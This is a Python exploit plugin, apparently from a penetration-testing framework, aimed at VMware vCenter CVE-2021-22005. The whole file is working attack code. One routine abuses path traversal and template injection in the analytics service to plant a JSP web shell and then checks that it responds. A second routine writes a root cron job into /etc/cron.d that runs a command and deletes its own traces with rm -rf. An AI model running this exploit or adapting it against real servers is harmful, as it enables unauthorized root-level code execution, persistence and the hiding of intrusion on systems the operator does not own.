import argparse
import random
import string
from copy import copy

from requests import Session

from plugins.VCenter import PluginVCenterBase
from utils import output
from utils.consts import AllPluginTypes


class PluginVCenterCVE_2021_22005(PluginVCenterBase):
    display = "CVE-2021-22005"
    alias = "cve_2021_22005"
    p_type = AllPluginTypes.Exploit

    def __init__(self):
        super().__init__()

    def reg_argument(self, parser: argparse.ArgumentParser):
        parser.description = self.display

        parser.add_argument("-i", "--ip", help="target ip address.(192.168.1.1)", dest="address")
        parser.add_argument("-p", "--proxy", help="proxy", dest="proxy")

    def run_script(self, args) -> dict:
        """
        脚本入口函数
        :return: bool
        """
        result = copy(self.result)
        ip = args.address
        proxy = args.proxy

        url = f'https://{ip}'

        def randname(length=5):
            return ''.join(random.choices(string.ascii_letters, k=length))

        # ----------------------------------exp1------------------------------------
        endpoint = '/analytics/ceip/sdk/..;/..;/..;/analytics/ph/api/dataapp/agent'
        shell_name = f"{randname()}.jsp"
        webshell_path = "/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/%s" % shell_name
        shell_code = """<% out.println(148666); %>"""
        json_data1 = {
            "manifestSpec": {},
            "objectType": "a2",
            "collectionTriggerDataNeeded": True,
            "deploymentDataNeeded": True,
            "resultNeeded": True,
            "signalCollectionCompleted": True,
            "localManifestPath": "a7",
            "localPayloadPath": "a8",
            "localObfuscationMapPath": "a9"
        }
        md = """<manifest recommendedPageSize="500">
                   <request>
                      <query name="vir:VCenter">
                         <constraint>
                            <targetType>ServiceInstance</targetType>
                         </constraint>
                         <propertySpec>
                            <propertyNames>content.about.instanceUuid</propertyNames>
                            <propertyNames>content.about.osType</propertyNames>
                            <propertyNames>content.about.build</propertyNames>
                            <propertyNames>content.about.version</propertyNames>
                         </propertySpec>
                      </query>
                   </request>
                   <cdfMapping>
                      <indepedentResultsMapping>
                         <resultSetMappings>
                            <entry>
                               <key>vir:VCenter</key>
                               <value>
                                  <value xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="resultSetMapping">
                                     <resourceItemToJsonLdMapping>
                                        <forType>ServiceInstance</forType>
                                     <mappingCode><![CDATA[    
                                        #set($appender = $GLOBAL-logger.logger.parent.getAppender("LOGFILE"))##
                                        #set($orig_log = $appender.getFile())##
                                        #set($logger = $GLOBAL-logger.logger.parent)##     
                                        $appender.setFile("%s")##     
                                        $appender.activateOptions()##  
                                        $logger.warn("%s")##   
                                        $appender.setFile($orig_log)##     
                                        $appender.activateOptions()##]]>
                                     </mappingCode>
                                     </resourceItemToJsonLdMapping>
                                  </value>
                               </value>
                            </entry>
                         </resultSetMappings>
                      </indepedentResultsMapping>
                   </cdfMapping>
                   <requestSchedules>
                      <schedule interval="1h">
                         <queries>
                            <query>vir:VCenter</query>
                         </queries>
                      </schedule>
                   </requestSchedules>
                </manifest>""" % (webshell_path, shell_code)
        json_data2 = {
            "contextData": "a3", "manifestContent": md, "objectId": "a2"
        }
        ci = {'_c': randname(),
              '_i': randname()
              }
        # ----------------------------------exp2------------------------------------
        endpoint2 = '/analytics/telemetry/ph/api/hyper/send'
        ci2 = {'_c': '',
               '_i': f'/{randname()}'
               }
        cmd = f'touch /tmp/{randname()}'
        task_name = randname()
        payload = f'''* * * * * root rm -rf /etc/cron.d/{task_name}.json /var/log/vmware/analytics/prod/_c_i/
        * * * * * root {cmd}'''
        ci3 = {'_c': '',
               '_i': f'/../../../../../../etc/cron.d/{task_name}'
               }

        with Session() as s:
            s.verify = False
            s.proxies = proxy
            s.headers = {'X-Deployment-Secret': 'abc'}
            output.info(f'\t{"-" * 20} poc1 {"-" * 20}')
            r = s.post(f'{url}{endpoint}', params=ci, json=json_data1)
            output.info(r)
            ci['action'] = 'collect'
            r = s.post(f'{url}{endpoint}', params=ci, json=json_data2)
            output.info(r)
            url = "%s/idm/..;/%s" % (url, shell_name)
            output.info(f'check: {url}')
            r = s.get(url)
            output.info(f'resp: {r.text}')

            output.info(f'\t{"-" * 20} poc2 {"-" * 20}')
            output.info(cmd)
            r = s.post(f'https://{ip}{endpoint2}', params=ci2)
            output.info(r)
            output.info(task_name)
            r = s.post(f'https://{ip}{endpoint2}', params=ci3, data=payload)
            output.info(r)

        return result
